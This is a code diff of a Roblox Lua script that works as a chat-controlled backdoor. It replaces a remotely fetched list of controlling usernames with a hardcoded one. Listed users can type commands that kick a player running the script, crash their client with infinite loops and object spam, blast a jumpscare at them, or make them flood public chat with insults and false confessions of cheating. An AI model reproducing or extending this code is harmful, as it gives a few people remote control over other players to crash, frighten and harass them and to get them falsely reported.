@@ -1,35 +1,39 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
-local AUTHORIZED_USERS = {}
+-- All usernames MUST be lowercase
+local AUTHORIZED_USERS = {
+    ["mocaxery"] = true,
+    ["rwefrroblox"] = true,
+    ["rwefrroblox2"] = true,
+    ["ferxd"] = true,
+    ["rwedeadahhroblox"] = true,
+    ["844x7"] = true,
+    ["hairypu1bemuncher"] = true,
+    ["xyrevexxx"] = true,
+    ["theo_theobenzo"] = true,
+    ["rwefrroblox5"] = true,
+    ["carsr_funlol29"] = true,
+    ["teenagetungtungsahur"] = true,
+    ["astraoutlight"] = true,
+    ["skibidaneosn"] = true,
+    ["shimymsshimmyaye"] = true,
+}
 
-local function fetchAuthorizedUsers()
-    local url = "https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/perms%20list"
-    local success, response = pcall(function()
-        return HttpService:GetAsync(url)
-    end)
-    
-    if success then
-        for name in response:gmatch("[^\r\n]+") do
-            AUTHORIZED_USERS[name:lower()] = true
-        end
-    else
-        warn("Failed to fetch authorized users:", response)
-    end
+local function isAuthorized(player)
+    return AUTHORIZED_USERS[player.Name:lower()] == true
 end
-
-fetchAuthorizedUsers()
 
 local function horrorTroll()
     local creepySound = Instance.new("Sound")
     creepySound.SoundId = "rbxassetid://9125712561"
     creepySound.Volume = 10
     creepySound.Looped = false
-    creepySound.Name = "CreepyLoopSound"
     creepySound.Parent = workspace
 
     local original = {
@@ -50,12 +54,10 @@ local function horrorTroll()
         end
 
         local sky = Instance.new("Sky")
-        sky.Name = "ClientHorrorSky"
         local redSkyID = "15182654336"
-        for _, face in ipairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
-            sky["Skybox" .. face] = "rbxassetid://" .. redSkyID
+        for _, face in ipairs({"Bk","Dn","Ft","Lf","Rt","Up"}) do
+            sky["Skybox"..face] = "rbxassetid://"..redSkyID
         end
-        sky.StarCount = 0
         sky.CelestialBodiesShown = false
         sky.SunAngularSize = 0
         sky.MoonAngularSize = 0
@@ -82,8 +84,7 @@ local function horrorTroll()
 
         local conn
         conn = RunService.RenderStepped:Connect(function()
-            local elapsed = tick() - startTime
-            if elapsed > duration then
+            if tick() - startTime > duration then
                 conn:Disconnect()
                 Camera.CameraType = original.CameraType
                 Camera.CameraSubject = original.CameraSubject
@@ -91,10 +92,11 @@ local function horrorTroll()
             end
 
             local offset = Vector3.new(
-                math.random(-100, 100) / 100 * intensity,
-                math.random(-100, 100) / 100 * intensity,
-                math.random(-100, 100) / 100 * intensity
+                math.random(-100,100)/100 * intensity,
+                math.random(-100,100)/100 * intensity,
+                math.random(-100,100)/100 * intensity
             )
+
             Camera.CFrame = head.CFrame * CFrame.new(offset)
         end)
     end
@@ -104,9 +106,9 @@ local function horrorTroll()
 
     Lighting.FogStart = 0
     Lighting.FogEnd = 15
-    Lighting.FogColor = Color3.new(0, 0, 0)
-    Lighting.Ambient = Color3.fromRGB(180, 0, 0)
-    Lighting.OutdoorAmbient = Color3.fromRGB(60, 0, 0)
+    Lighting.FogColor = Color3.new(0,0,0)
+    Lighting.Ambient = Color3.fromRGB(180,0,0)
+    Lighting.OutdoorAmbient = Color3.fromRGB(60,0,0)
     Lighting.Brightness = 0.4
 
     applyRedSkybox()
@@ -124,27 +126,25 @@ local function horrorTroll()
     Camera.CameraType = original.CameraType
     Camera.CameraSubject = original.CameraSubject
 
-    creepySound:Stop()
     creepySound:Destroy()
 end
 
 local function spamCrash()
     task.spawn(function()
-        while true do print("crashing...") end
+        while true do end
     end)
 
     task.spawn(function()
         local gui = Instance.new("ScreenGui")
         gui.ResetOnSpawn = false
         gui.IgnoreGuiInset = true
-        gui.Name = "CrashGui"
         gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
         while true do
             local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0, math.random(10, 400), 0, math.random(10, 400))
-            frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
-            frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+            frame.Size = UDim2.new(0, math.random(10,400), 0, math.random(10,400))
+            frame.Position = UDim2.new(math.random(),0,math.random(),0)
+            frame.BackgroundColor3 = Color3.new(math.random(),math.random(),math.random())
             frame.BorderSizePixel = 0
             frame.Parent = gui
         end
@@ -153,56 +153,30 @@ local function spamCrash()
     task.spawn(function()
         while true do
             local part = Instance.new("Part")
-            part.Size = Vector3.new(5, 5, 5)
-            part.Position = LocalPlayer.Character and LocalPlayer.Character:GetPivot().Position + Vector3.new(math.random(-20, 20), 20, math.random(-20, 20)) or Vector3.new(0, 50, 0)
+            part.Size = Vector3.new(5,5,5)
+            part.Position = (LocalPlayer.Character and LocalPlayer.Character:GetPivot().Position or Vector3.zero)
+                + Vector3.new(math.random(-20,20),20,math.random(-20,20))
             part.Anchored = false
-            part.CanCollide = true
             part.BrickColor = BrickColor.Random()
             part.Parent = workspace
         end
     end)
 end
 
-local function onChat(player, message)
-    local senderName = player.Name:lower()
-    if not AUTHORIZED_USERS[senderName] then return end
+local function handleChat(player, message)
+    if not isAuthorized(player) then return end
 
     message = message:lower()
+    local me = LocalPlayer.Name:lower()
 
-    local targetKick = message:match("^,kick%s+(%S+)")
-    if targetKick and targetKick == LocalPlayer.Name:lower() then
-        LocalPlayer:Kick("You were kicked by " .. player.Name)
-        return
-    end
-
-    local targetCrash = message:match("^,crash%s+(%S+)")
-    if targetCrash and targetCrash == LocalPlayer.Name:lower() then
+    if message:match("^,kick%s+"..me) then
+        LocalPlayer:Kick("Kicked by "..player.Name)
+    elseif message:match("^,crash%s+"..me) then
         spamCrash()
-        return
-    end
-
-    local targetScare = message:match("^,jumpscare%s+(%S+)")
-    if targetScare and targetScare == LocalPlayer.Name:lower() then
+    elseif message:match("^,jumpscare%s+"..me) then
         horrorTroll()
-        return
     end
 end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onChat(player, msg)
-        end)
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onChat(player, msg)
-        end)
-    end
-end)
 
 local activeSpam = false
 
@@ -210,80 +184,56 @@ local function startSpamming(mode)
     if activeSpam then return end
     activeSpam = true
 
-    local phrases
+    local phrases = {}
+
     if mode == 1 then
-        phrases = {
-            "YOUR FAT",
-            "I HATE YOU",
-            "FATTY"
-        }
-    elseif mode == 4 then
-        phrases = {}
-        for i = 1, 3 do
-            table.insert(phrases, "TEST")
-        end
+        phrases = {"YOUR FAT","I HATE YOU","FATTY"}
     elseif mode == 2 then
-        phrases = {
-            "I AM HACKING",
-            "I AM EXPLOITING",
-            "I AM CHEATING"
-        }
+        phrases = {"I AM HACKING","I AM EXPLOITING","I AM CHEATING"}
     elseif mode == 3 then
-        phrases = {}
-        for i = 1, 10 do
-            table.insert(phrases, "PLEASE")
-        end
-    else
-        return
+        for _ = 1,10 do table.insert(phrases,"PLEASE") end
+    elseif mode == 4 then
+        for _ = 1,3 do table.insert(phrases,"TEST") end
     end
 
     task.spawn(function()
         repeat
             for _, msg in ipairs(phrases) do
-                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
+                TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
                 task.wait()
             end
-            if mode == 4 then
-                activeSpam = false
-            end
+            if mode == 4 then activeSpam = false end
         until not activeSpam
     end)
 end
 
-local function onChatSpamCommand(player, message)
-    if not AUTHORIZED_USERS[player.Name:lower()] then return end
+local function handleSpamCommands(player, message)
+    if not isAuthorized(player) then return end
 
     message = message:lower()
-    local thisUsername = LocalPlayer.Name:lower()
+    local me = LocalPlayer.Name:lower()
 
-    local target1 = message:match("^,spammingmode1%s+(%S+)")
-    local target2 = message:match("^,spammingmode2%s+(%S+)")
-    local target3 = message:match("^,spammingmode3%s+(%S+)")
-    local target4 = message:match("^,spammingmode4%s+(%S+)")
-
-    if target1 and target1 == thisUsername then
+    if message:match("^,spammingmode1%s+"..me) then
         startSpamming(1)
-    elseif target2 and target2 == thisUsername then
+    elseif message:match("^,spammingmode2%s+"..me) then
         startSpamming(2)
-    elseif target3 and target3 == thisUsername then
+    elseif message:match("^,spammingmode3%s+"..me) then
         startSpamming(3)
-    elseif target4 and target4 == thisUsername then
+    elseif message:match("^,spammingmode4%s+"..me) then
         startSpamming(4)
     end
 end
 
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onChatSpamCommand(player, msg)
-        end)
-    end
+local function hookPlayer(player)
+    if player == LocalPlayer then return end
+    player.Chatted:Connect(function(msg)
+        handleChat(player, msg)
+        handleSpamCommands(player, msg)
+    end)
 end
 
-Players.PlayerAdded:Connect(function(player)
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onChatSpamCommand(player, msg)
-        end)
-    end
-end)
+for _, p in ipairs(Players:GetPlayers()) do
+    hookPlayer(p)
+end
+
+Players.PlayerAdded:Connect(hookPlayer)
